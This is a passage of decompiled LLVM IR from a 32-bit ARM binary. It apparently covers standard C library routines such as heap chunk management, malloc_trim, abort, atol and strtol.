  %v1_12b7c = add i32 %v0_12b7c, -4
  %v2_12b7c = inttoptr i32 %v1_12b7c to i32*
  %v3_12b7c = load i32, i32* %v2_12b7c, align 4
  store i32 %v3_12b7c, i32* %r3.global-to-local, align 4
  %v0_12b80 = load i32, i32* @r5, align 4
  %v1_12b80 = load i32, i32* %ip.global-to-local, align 4
  %v2_12b80 = add i32 %v1_12b80, %v0_12b80
  store i32 %v2_12b80, i32* %lr.global-to-local, align 4
  %v1_12b84 = urem i32 %v3_12b7c, 2
  %v2_12b84 = icmp eq i32 %v1_12b84, 0
  %v1_12b88 = add i32 %v2_12b80, 4
  %v2_12b88 = inttoptr i32 %v1_12b88 to i32*
  %v3_12b88 = load i32, i32* %v2_12b88, align 4
  store i32 %v3_12b88, i32* %r8.global-to-local, align 4
  br i1 %v2_12b84, label %dec_label_pc_12b90, label %dec_label_pc_12bc4

dec_label_pc_12b90:                               ; preds = %dec_label_pc_12b74
  %v1_12b90 = add i32 %v0_12b7c, -8
  %v2_12b90 = inttoptr i32 %v1_12b90 to i32*
  %v3_12b90 = load i32, i32* %v2_12b90, align 4
  store i32 %v3_12b90, i32* %r1.global-to-local, align 4
  %v2_12b94 = sub i32 %v0_12b80, %v3_12b90
  store i32 %v2_12b94, i32* %r3.global-to-local, align 4
  %v1_12b98 = add i32 %v2_12b94, 8
  %v2_12b98 = inttoptr i32 %v1_12b98 to i32*
  %v3_12b98 = load i32, i32* %v2_12b98, align 4
  store i32 %v3_12b98, i32* %r2.global-to-local, align 4
  %v1_12b9c = add i32 %v3_12b98, 12
  %v2_12b9c = inttoptr i32 %v1_12b9c to i32*
  %v3_12b9c = load i32, i32* %v2_12b9c, align 4
  store i32 %v3_12b9c, i32* %r4.global-to-local, align 4
  %v9_12ba0 = icmp eq i32 %v3_12b9c, %v2_12b94
  %v1_12ba4 = add i32 %v2_12b94, 12
  %v2_12ba4 = inttoptr i32 %v1_12ba4 to i32*
  %v3_12ba4 = load i32, i32* %v2_12ba4, align 4
  store i32 %v3_12ba4, i32* %r0.global-to-local, align 4
  br i1 %v9_12ba0, label %dec_label_pc_12bac, label %dec_label_pc_12c10

dec_label_pc_12bac:                               ; preds = %dec_label_pc_12b90
  %v1_12bac = add i32 %v3_12ba4, 8
  %v2_12bac = inttoptr i32 %v1_12bac to i32*
  %v3_12bac = load i32, i32* %v2_12bac, align 4
  store i32 %v3_12bac, i32* %r3.global-to-local, align 4
  %v9_12bb0 = icmp eq i32 %v3_12bac, %v2_12b94
  br i1 %v9_12bb0, label %dec_label_pc_12bb8, label %dec_label_pc_12c10

dec_label_pc_12bb8:                               ; preds = %dec_label_pc_12bac
  store i32 %v3_12b98, i32* %v2_12bac, align 4
  %v0_12bbc = load i32, i32* %r0.global-to-local, align 4
  %v1_12bbc = load i32, i32* %r2.global-to-local, align 4
  %v2_12bbc = add i32 %v1_12bbc, 12
  %v3_12bbc = inttoptr i32 %v2_12bbc to i32*
  store i32 %v0_12bbc, i32* %v3_12bbc, align 4
  %v0_12bc0 = load i32, i32* %ip.global-to-local, align 4
  %v1_12bc0 = load i32, i32* %r1.global-to-local, align 4
  %v2_12bc0 = add i32 %v1_12bc0, %v0_12bc0
  store i32 %v2_12bc0, i32* %ip.global-to-local, align 4
  %v0_12bd0.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_12bd4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_12bc4

dec_label_pc_12bc4:                               ; preds = %dec_label_pc_12b74, %dec_label_pc_12bb8
  %v0_12c50 = phi i32 [ %v1_12b80, %dec_label_pc_12b74 ], [ %v2_12bc0, %dec_label_pc_12bb8 ]
  %v0_12bd4 = phi i32 [ %v3_12b88, %dec_label_pc_12b74 ], [ %v0_12bd4.pre, %dec_label_pc_12bb8 ]
  %v1_12be8 = phi i32 [ %v2_12b80, %dec_label_pc_12b74 ], [ %v0_12bd0.pre, %dec_label_pc_12bb8 ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_12bc8 = load i32, i32* @r7, align 4
  %v2_12bc8 = add i32 %v0_12bc8, 64
  %v3_12bc8 = inttoptr i32 %v2_12bc8 to i32*
  %v4_12bc8 = load i32, i32* %v3_12bc8, align 4
  store i32 %v4_12bc8, i32* %r2.global-to-local, align 4
  %v1_12bcc = add i32 %v4_12bc8, 44
  %v2_12bcc = inttoptr i32 %v1_12bcc to i32*
  %v3_12bcc = load i32, i32* %v2_12bcc, align 4
  store i32 %v3_12bcc, i32* %r3.global-to-local, align 4
  %v9_12bd0 = icmp eq i32 %v1_12be8, %v3_12bcc
  %v1_12bd4 = and i32 %v0_12bd4, -4
  store i32 %v1_12bd4, i32* %r0.global-to-local, align 4
  br i1 %v9_12bd0, label %dec_label_pc_12c50, label %dec_label_pc_12bdc

dec_label_pc_12bdc:                               ; preds = %dec_label_pc_12bc4
  %v2_12bdc = add i32 %v1_12be8, %v1_12bd4
  store i32 %v2_12bdc, i32* %r3.global-to-local, align 4
  %v1_12be0 = add i32 %v2_12bdc, 4
  %v2_12be0 = inttoptr i32 %v1_12be0 to i32*
  %v3_12be0 = load i32, i32* %v2_12be0, align 4
  store i32 %v3_12be0, i32* %r3.global-to-local, align 4
  %v1_12be4 = urem i32 %v3_12be0, 2
  %v2_12be4 = icmp eq i32 %v1_12be4, 0
  %v2_12be8 = add i32 %v1_12be8, 4
  %v3_12be8 = inttoptr i32 %v2_12be8 to i32*
  store i32 %v1_12bd4, i32* %v3_12be8, align 4
  br i1 %v2_12be4, label %dec_label_pc_12bf0, label %dec_label_pc_12bdc.dec_label_pc_12c20_crit_edge

dec_label_pc_12bdc.dec_label_pc_12c20_crit_edge:  ; preds = %dec_label_pc_12bdc
  %v0_12c30.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12c20

dec_label_pc_12bf0:                               ; preds = %dec_label_pc_12bdc
  %v0_12bf0 = load i32, i32* %lr.global-to-local, align 4
  %v1_12bf0 = add i32 %v0_12bf0, 8
  %v2_12bf0 = inttoptr i32 %v1_12bf0 to i32*
  %v3_12bf0 = load i32, i32* %v2_12bf0, align 4
  store i32 %v3_12bf0, i32* %r1.global-to-local, align 4
  %v1_12bf4 = add i32 %v3_12bf0, 12
  %v2_12bf4 = inttoptr i32 %v1_12bf4 to i32*
  %v3_12bf4 = load i32, i32* %v2_12bf4, align 4
  store i32 %v3_12bf4, i32* %r3.global-to-local, align 4
  %v9_12bf8 = icmp eq i32 %v3_12bf4, %v0_12bf0
  %v1_12bfc = add i32 %v0_12bf0, 12
  %v2_12bfc = inttoptr i32 %v1_12bfc to i32*
  %v3_12bfc = load i32, i32* %v2_12bfc, align 4
  store i32 %v3_12bfc, i32* %r2.global-to-local, align 4
  br i1 %v9_12bf8, label %dec_label_pc_12c04, label %dec_label_pc_12c10

dec_label_pc_12c04:                               ; preds = %dec_label_pc_12bf0
  %v1_12c04 = add i32 %v3_12bfc, 8
  %v2_12c04 = inttoptr i32 %v1_12c04 to i32*
  %v3_12c04 = load i32, i32* %v2_12c04, align 4
  store i32 %v3_12c04, i32* %r3.global-to-local, align 4
  %v9_12c08 = icmp eq i32 %v3_12c04, %v0_12bf0
  br i1 %v9_12c08, label %dec_label_pc_12c14, label %dec_label_pc_12c10

dec_label_pc_12c10:                               ; preds = %dec_label_pc_12bf0, %dec_label_pc_12bac, %dec_label_pc_12b90, %dec_label_pc_12c04
  %v0_12c10 = call i32 @abort()
  store i32 %v0_12c10, i32* %r0.global-to-local, align 4
  %v0_12c14.pre = load i32, i32* @r1, align 4
  %v1_12c14.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_12c14

dec_label_pc_12c14:                               ; preds = %dec_label_pc_12c04, %dec_label_pc_12c10
  %v1_12c14 = phi i32 [ %v3_12bfc, %dec_label_pc_12c04 ], [ %v1_12c14.pre, %dec_label_pc_12c10 ]
  %v0_12c14 = phi i32 [ %v3_12bf0, %dec_label_pc_12c04 ], [ %v0_12c14.pre, %dec_label_pc_12c10 ]
  %v2_12c14 = add i32 %v1_12c14, 8
  %v3_12c14 = inttoptr i32 %v2_12c14 to i32*
  store i32 %v0_12c14, i32* %v3_12c14, align 4
  %v0_12c18 = load i32, i32* %r2.global-to-local, align 4
  %v1_12c18 = load i32, i32* %r1.global-to-local, align 4
  %v2_12c18 = add i32 %v1_12c18, 12
  %v3_12c18 = inttoptr i32 %v2_12c18 to i32*
  store i32 %v0_12c18, i32* %v3_12c18, align 4
  %v0_12c1c = load i32, i32* %ip.global-to-local, align 4
  %v1_12c1c = load i32, i32* %r0.global-to-local, align 4
  %v2_12c1c = add i32 %v1_12c1c, %v0_12c1c
  store i32 %v2_12c1c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12c20

dec_label_pc_12c20:                               ; preds = %dec_label_pc_12bdc.dec_label_pc_12c20_crit_edge, %dec_label_pc_12c14
  %v0_12c30 = phi i32 [ %v0_12c30.pre, %dec_label_pc_12bdc.dec_label_pc_12c20_crit_edge ], [ %v2_12c1c, %dec_label_pc_12c14 ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_12c24 = load i32, i32* @r7, align 4
  %v2_12c24 = add i32 %v0_12c24, 64
  %v3_12c24 = inttoptr i32 %v2_12c24 to i32*
  %v4_12c24 = load i32, i32* %v3_12c24, align 4
  %v1_12c28 = add i32 %v4_12c24, 52
  store i32 %v1_12c28, i32* %r3.global-to-local, align 4
  %v1_12c2c = add i32 %v4_12c24, 60
  %v2_12c2c = inttoptr i32 %v1_12c2c to i32*
  %v3_12c2c = load i32, i32* %v2_12c2c, align 4
  store i32 %v3_12c2c, i32* %r1.global-to-local, align 4
  %v1_12c30 = or i32 %v0_12c30, 1
  store i32 %v1_12c30, i32* %r2.global-to-local, align 4
  %v1_12c34 = load i32, i32* %r4.global-to-local, align 4
  %v2_12c34 = add i32 %v1_12c34, 12
  %v3_12c34 = inttoptr i32 %v2_12c34 to i32*
  store i32 %v1_12c28, i32* %v3_12c34, align 4
  %v0_12c38 = load i32, i32* %r1.global-to-local, align 4
  %v1_12c38 = load i32, i32* %r4.global-to-local, align 4
  %v2_12c38 = add i32 %v1_12c38, 8
  %v3_12c38 = inttoptr i32 %v2_12c38 to i32*
  store i32 %v0_12c38, i32* %v3_12c38, align 4
  %v0_12c3c = load i32, i32* %r2.global-to-local, align 4
  %v1_12c3c = load i32, i32* %r4.global-to-local, align 4
  %v2_12c3c = add i32 %v1_12c3c, 4
  %v3_12c3c = inttoptr i32 %v2_12c3c to i32*
  store i32 %v0_12c3c, i32* %v3_12c3c, align 4
  %v0_12c40 = load i32, i32* %ip.global-to-local, align 4
  %v1_12c40 = load i32, i32* %r4.global-to-local, align 4
  %v3_12c40 = add i32 %v1_12c40, %v0_12c40
  %v4_12c40 = inttoptr i32 %v3_12c40 to i32*
  store i32 %v0_12c40, i32* %v4_12c40, align 4
  %v0_12c44 = load i32, i32* %r4.global-to-local, align 4
  %v1_12c44 = load i32, i32* %r1.global-to-local, align 4
  %v2_12c44 = add i32 %v1_12c44, 12
  %v3_12c44 = inttoptr i32 %v2_12c44 to i32*
  store i32 %v0_12c44, i32* %v3_12c44, align 4
  %v0_12c48 = load i32, i32* %r4.global-to-local, align 4
  %v1_12c48 = load i32, i32* %r3.global-to-local, align 4
  %v2_12c48 = add i32 %v1_12c48, 8
  %v3_12c48 = inttoptr i32 %v2_12c48 to i32*
  store i32 %v0_12c48, i32* %v3_12c48, align 4
  br label %dec_label_pc_12c60

dec_label_pc_12c50:                               ; preds = %dec_label_pc_12bc4
  %v2_12c50 = add i32 %v1_12bd4, %v0_12c50
  store i32 %v2_12c50, i32* %ip.global-to-local, align 4
  %v1_12c54 = or i32 %v2_12c50, 1
  store i32 %v1_12c54, i32* %r3.global-to-local, align 4
  %v0_12c58 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12c58, i32* %v2_12bcc, align 4
  %v0_12c5c = load i32, i32* %r3.global-to-local, align 4
  %v1_12c5c = load i32, i32* %r4.global-to-local, align 4
  %v2_12c5c = add i32 %v1_12c5c, 4
  %v3_12c5c = inttoptr i32 %v2_12c5c to i32*
  store i32 %v0_12c5c, i32* %v3_12c5c, align 4
  br label %dec_label_pc_12c60

dec_label_pc_12c60:                               ; preds = %dec_label_pc_12c20, %dec_label_pc_12c50
  %v0_12c60 = load i32, i32* %ip.global-to-local, align 4
  %v3_12c64 = icmp ult i32 %v0_12c60, 131070
  br i1 %v3_12c64, label %dec_label_pc_12cd0, label %dec_label_pc_12c68

dec_label_pc_12c68:                               ; preds = %dec_label_pc_12c60
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_12c6c = load i32, i32* @r7, align 4
  %v2_12c6c = add i32 %v0_12c6c, 64
  %v3_12c6c = inttoptr i32 %v2_12c6c to i32*
  %v4_12c6c = load i32, i32* %v3_12c6c, align 4
  store i32 %v4_12c6c, i32* @r4, align 4
  %v1_12c70 = inttoptr i32 %v4_12c6c to i32*
  %v2_12c70 = load i32, i32* %v1_12c70, align 4
  store i32 %v2_12c70, i32* %r3.global-to-local, align 4
  %v1_12c74 = and i32 %v2_12c70, 2
  %v2_12c74 = icmp eq i32 %v1_12c74, 0
  br i1 %v2_12c74, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_12c68
  store i32 %v4_12c6c, i32* %r0.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_12c68, %bb
  %v1_12c7c = xor i1 %v2_12c74, true
  call void @__pseudo_cond_branch(i1 %v1_12c7c, i32 ptrtoint (i32* @global_var_12920.422 to i32))
  %v0_12c80 = load i32, i32* @r4, align 4
  %v1_12c80 = add i32 %v0_12c80, 44
  %v2_12c80 = inttoptr i32 %v1_12c80 to i32*
  %v3_12c80 = load i32, i32* %v2_12c80, align 4
  store i32 %v3_12c80, i32* %r3.global-to-local, align 4
  %v1_12c84 = add i32 %v3_12c80, 4
  %v2_12c84 = inttoptr i32 %v1_12c84 to i32*
  %v3_12c84 = load i32, i32* %v2_12c84, align 4
  store i32 %v3_12c84, i32* %r3.global-to-local, align 4
  %v1_12c88 = add i32 %v0_12c80, 836
  %v2_12c88 = inttoptr i32 %v1_12c88 to i32*
  %v3_12c88 = load i32, i32* %v2_12c88, align 4
  store i32 %v3_12c88, i32* %r2.global-to-local, align 4
  %v1_12c8c = and i32 %v3_12c84, -4
  store i32 %v1_12c8c, i32* %r3.global-to-local, align 4
  %v3_12c90 = icmp ult i32 %v1_12c8c, %v3_12c88
  br i1 %v3_12c90, label %dec_label_pc_12cd0, label %dec_label_pc_12c98

dec_label_pc_12c98:                               ; preds = %bb16
  store i32 %v0_12c80, i32* %r1.global-to-local, align 4
  %v1_12c9c = add i32 %v0_12c80, 840
  %v2_12c9c = inttoptr i32 %v1_12c9c to i32*
  %v3_12c9c = load i32, i32* %v2_12c9c, align 4
  store i32 %v3_12c9c, i32* %r0.global-to-local, align 4
  %v2_12ca0 = call i32 @__malloc_trim(i32 %v3_12c9c, i32 %v0_12c80)
  store i32 %v2_12ca0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12cd0

dec_label_pc_12ca8:                               ; preds = %dec_label_pc_12b6c
  %v2_12ca8 = inttoptr i32 %v1_12b3c to i32*
  %v3_12ca8 = load i32, i32* %v2_12ca8, align 4
  store i32 %v3_12ca8, i32* %r0.global-to-local, align 4
  %v1_12cac = add i32 %v4_12b2c, 848
  %v2_12cac = inttoptr i32 %v1_12cac to i32*
  %v3_12cac = load i32, i32* %v2_12cac, align 4
  store i32 %v3_12cac, i32* %r2.global-to-local, align 4
  %v1_12cb0 = add i32 %v4_12b2c, 868
  %v2_12cb0 = inttoptr i32 %v1_12cb0 to i32*
  %v3_12cb0 = load i32, i32* %v2_12cb0, align 4
  %v2_12cb4 = add i32 %v3_12ca8, %v1_12b38
  store i32 %v2_12cb4, i32* %r1.global-to-local, align 4
  %v1_12cb8 = add i32 %v3_12cac, -1
  store i32 %v1_12cb8, i32* %r2.global-to-local, align 4
  %v2_12cbc = sub i32 %v3_12cb0, %v2_12cb4
  store i32 %v2_12cbc, i32* %r3.global-to-local, align 4
  store i32 %v2_12cbc, i32* %v2_12cb0, align 4
  %v1_12cc4 = load i32, i32* @lr, align 4
  %v2_12cc4 = add i32 %v1_12cc4, 848
  %v3_12cc4 = inttoptr i32 %v2_12cc4 to i32*
  store i32 %v1_12cb8, i32* %v3_12cc4, align 4
  %v0_12cc8 = load i32, i32* %r0.global-to-local, align 4
  %v1_12cc8 = load i32, i32* @r5, align 4
  %v2_12cc8 = sub i32 %v1_12cc8, %v0_12cc8
  store i32 %v2_12cc8, i32* %r0.global-to-local, align 4
  %v4_12ccc = call i32 @munmap(i32 %v2_12cc8, i32 %v2_12cb4, i32 %v1_12cb8, i32 %v2_12cbc)
  store i32 %v4_12ccc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12cd0

dec_label_pc_12cd0:                               ; preds = %bb16, %dec_label_pc_12c60, %dec_label_pc_12c98, %dec_label_pc_12b4c, %dec_label_pc_12ca8
  store i32 %v2_12ae0, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_12cdc = load i32, i32* @r7, align 4
  %v2_12cdc = add i32 %v0_12cdc, 44
  %v3_12cdc = inttoptr i32 %v2_12cdc to i32*
  %v4_12cdc = load i32, i32* %v3_12cdc, align 4
  store i32 %v4_12cdc, i32* %ip.global-to-local, align 4
  store i32 77032, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12cdc)
  br label %dec_label_pc_12ce8

dec_label_pc_12ce8:                               ; preds = %entry, %dec_label_pc_12cd0
  store i32 %v3_12ad4, i32* @r4, align 4
  store i32 %v6_12ad4, i32* @r5, align 4
  store i32 %v9_12ad4, i32* @r6, align 4
  store i32 %v12_12ad4, i32* @r7, align 4
  store i32 %v18_12ad4, i32* @lr, align 4
  ret i32 %v2_12ae0

; uselistorder directives
  uselistorder i32 %v0_12c80, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_12c40, { 1, 0 }
  uselistorder i32 %v1_12b80, { 1, 0 }
  uselistorder i32 %v0_12b80, { 1, 0 }
  uselistorder i32 %v3_12b54, { 1, 0 }
  uselistorder i32 %v1_12b38, { 1, 0, 2 }
  uselistorder i32 %v2_12b34, { 1, 2, 0, 3 }
  uselistorder i32 %v4_12b2c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12adc, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 1, 2, 3, 7, 5, 6, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 0, 5, 1, 6, 2, 7, 4, 3, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 868, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 68) to i32*), { 0, 2, 3, 4, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 108) to i32*), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_12ce8, { 1, 0 }
  uselistorder label %dec_label_pc_12cd0, { 4, 2, 0, 1, 3 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_12c60, { 1, 0 }
  uselistorder label %dec_label_pc_12c20, { 1, 0 }
  uselistorder label %dec_label_pc_12c14, { 1, 0 }
  uselistorder label %dec_label_pc_12c10, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12bc4, { 1, 0 }
}

define i32 @function_12cf8(i32 %arg1) local_unnamed_addr {
dec_label_pc_12cf8:
  %v0_12cf8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12cf8, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_12cf8
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_12cf8, %bb
  %v4_12d0c = phi i32 [ %arg1, %dec_label_pc_12cf8 ], [ 0, %bb ]
  ret i32 %v4_12d0c

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_12d10 = load i32, i32* @r4, align 4
  store i32 %v3_12d10, i32* %stack_var_-12, align 4
  %v6_12d10 = load i32, i32* @r5, align 4
  %v4_12d20 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 64) to i32*), align 4
  store i32 %v4_12d20, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v4_12d20, i32* @r0, align 4
  %v0_12d30 = call i32 @__malloc_consolidate()
  %v0_12d34 = load i32, i32* @r4, align 4
  %v0_12d38 = load i32, i32* @r5, align 4
  %v2_12d40 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_12d40, i32* @r4, align 4
  store i32 %v6_12d10, i32* @r5, align 4
  %v2_12d44 = call i32 @__malloc_trim(i32 %v0_12d34, i32 %v0_12d38)
  %v0_12d48 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12d48, label %bb, label %.thread

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v4_12d4c = phi i32 [ %v2_12d44, %entry ], [ 0, %bb ]
  ret i32 %v4_12d4c

; uselistorder directives
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 3, 2, 1, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 64) to i32*), { 17, 3, 2, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* @r5, align 4
  %v4_12d68 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 16) to i32*), align 4
  store i32 77172, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12d68)
  store i32 32, i32* %stack_var_-8, align 4
  %v4_12d90 = call i32 @__GI_sigprocmask(i32 1, i32* nonnull %stack_var_-8, i32 0)
  %v0_12d98 = load i32, i32* @r5, align 4
  %v2_12d98 = add i32 %v0_12d98, 632
  %v3_12d98 = inttoptr i32 %v2_12d98 to i32*
  %v4_12d98 = load i32, i32* %v3_12d98, align 4
  %v2_12d9c = icmp eq i32 %v4_12d98, 0
  br i1 %v2_12d9c, label %dec_label_pc_12da4, label %dec_label_pc_12de4

dec_label_pc_12da4:                               ; preds = %entry
  store i32 1, i32* %v3_12d98, align 4
  br label %dec_label_pc_12dac

dec_label_pc_12dac:                               ; preds = %dec_label_pc_12df4, %dec_label_pc_12da4
  %v0_12db0 = load i32, i32* @r5, align 4
  %v2_12db0 = add i32 %v0_12db0, 212
  store i32 %v2_12db0, i32* @r4, align 4
  %v2_12dbc = add i32 %v0_12db0, 68
  %v3_12dbc = inttoptr i32 %v2_12dbc to i32*
  %v4_12dbc = load i32, i32* %v3_12dbc, align 4
  call void @__pseudo_branch(i32 %v4_12dbc)
  %v1_12dcc = call i32 @__GI_raise(i32 6)
  %v0_12dd8 = load i32, i32* @r5, align 4
  %v2_12dd8 = add i32 %v0_12dd8, 16
  %v3_12dd8 = inttoptr i32 %v2_12dd8 to i32*
  %v4_12dd8 = load i32, i32* %v3_12dd8, align 4
  store i32 77284, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12dd8)
  %v0_12de8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_12de4

dec_label_pc_12de4:                               ; preds = %entry, %dec_label_pc_12dac
  %v1_12dfc = phi i32 [ %v0_12d98, %entry ], [ %v0_12de8.pre, %dec_label_pc_12dac ]
  %v2_12de8 = add i32 %v1_12dfc, 632
  %v3_12de8 = inttoptr i32 %v2_12de8 to i32*
  %v4_12de8 = load i32, i32* %v3_12de8, align 4
  %v7_12dec = icmp eq i32 %v4_12de8, 1
  br i1 %v7_12dec, label %dec_label_pc_12df4, label %dec_label_pc_12e30

dec_label_pc_12df4:                               ; preds = %dec_label_pc_12de4
  %v2_12df4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_12df4, i32* @r4, align 4
  store i32 2, i32* %v3_12de8, align 4
  %v3_12e0c = bitcast i32* %stack_var_-28 to i8*
  %v4_12e0c = call i32 @__GI_memset(i8* %v3_12e0c, i32 0, i32 20)
  %v3_12e28 = call i32 @__libc_sigaction(i32 6, i32 %v2_12df4, i32 0)
  br label %dec_label_pc_12dac

dec_label_pc_12e30:                               ; preds = %dec_label_pc_12de4
  %v7_12e30 = icmp eq i32 %v4_12de8, 2
  br i1 %v7_12e30, label %dec_label_pc_12e38, label %dec_label_pc_12e44

dec_label_pc_12e38:                               ; preds = %dec_label_pc_12e30
  store i32 3, i32* %v3_12de8, align 4
  %v0_12e40 = call i32 @abort()
  %v0_12e44.pre = load i32, i32* @r5, align 4
  %v1_12e44.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_12e44

dec_label_pc_12e44:                               ; preds = %dec_label_pc_12e30, %dec_label_pc_12e38
  %v3_12e50 = phi i32 [ 632, %dec_label_pc_12e30 ], [ %v1_12e44.pre, %dec_label_pc_12e38 ]
  %v2_12e50 = phi i32 [ %v1_12dfc, %dec_label_pc_12e30 ], [ %v0_12e44.pre, %dec_label_pc_12e38 ]
  %v2_12e44 = add i32 %v2_12e50, %v3_12e50
  %v3_12e44 = inttoptr i32 %v2_12e44 to i32*
  %v4_12e44 = load i32, i32* %v3_12e44, align 4
  %v7_12e48 = icmp eq i32 %v4_12e44, 3
  br i1 %v7_12e48, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_12e44
  store i32 4, i32* %v3_12e44, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_12e44, %bb
  call void @__pseudo_cond_branch(i1 %v7_12e48, i32 ptrtoint (i32* @global_var_14a30.431 to i32))
  br label %dec_label_pc_12e5c

dec_label_pc_12e5c:                               ; preds = %dec_label_pc_12e5c, %.thread2
  %v0_12e5c = call i32 @abort()
  br label %dec_label_pc_12e5c

; uselistorder directives
  uselistorder i32* %v3_12de8, { 1, 0, 2 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 16) to i32*), { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_12e44, { 1, 0 }
  uselistorder label %dec_label_pc_12de4, { 1, 0 }
}

define i32 @function_12e68(i64* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12e68:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_12e68 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12e68, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_12e68
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_12e68, %bb
  %v4_12e74 = phi i32 [ %tmp, %dec_label_pc_12e68 ], [ 0, %bb ]
  ret i32 %v4_12e74

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_12e88 = call i32 @strtol()
  ret i32 %v0_12e88
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_12ea4 = call i32 @_stdlib_strto_l()
  ret i32 %v0_12ea4
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %ip.global-to-local, align 4
  %v0_12ec8 = load i32, i32* @r1, align 4
  store i32 %v0_12ec8, i32* %sb.global-to-local, align 4
  %v0_12ecc = load i32, i32* @r2, align 4
  store i32 %v0_12ecc, i32* %r5.global-to-local, align 4
  %v0_12ed0 = load i32, i32* @r0, align 4
  store i32 %v0_12ed0, i32* %r4.global-to-local, align 4
  %v0_12ed4 = load i32, i32* @r3, align 4
  br label %dec_label_pc_12ee0

dec_label_pc_12edc:                               ; preds = %dec_label_pc_12ee0
  %v1_12edc = add i32 %v0_12f18, 1
  store i32 %v1_12edc, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12ee0

dec_label_pc_12ee0:                               ; preds = %entry, %dec_label_pc_12edc
  %v0_12f18 = phi i32 [ %v0_12ed0, %entry ], [ %v1_12edc, %dec_label_pc_12edc ]
  %v1_12ee0 = inttoptr i32 %v0_12f18 to i8*
  %v2_12ee0 = load i8, i8* %v1_12ee0, align 1
  %v3_12ee0 = zext i8 %v2_12ee0 to i32
  store i32 %v3_12ee0, i32* %r1.global-to-local, align 4
